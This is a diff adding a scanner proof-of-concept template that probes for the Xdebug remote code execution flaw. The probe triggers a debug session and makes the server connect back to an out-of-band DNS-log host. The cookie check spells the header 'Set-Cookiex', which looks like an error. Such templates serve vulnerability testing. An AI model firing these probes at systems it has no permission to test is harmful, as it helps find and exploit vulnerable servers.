@@ -1,0 +1,25 @@
+id: poc-yaml-xdebug-rce
+info:
+  name: Xdebug 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Xdebug
+  osprey-id: vb_2019_0081
+variables:
+  random: random_str(6)
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /?XDEBUG_SESSION_START={{.random}}
+  headers:
+    X-Forwarded-For: '{{.domain}}'
+  expression: 'status_code == 200 &&
+
+    contains(headers,"Set-Cookiex: XDEBUG_SESSION=" + random) &&
+
+    reverse.Verify()
+
+    '
+transport: http
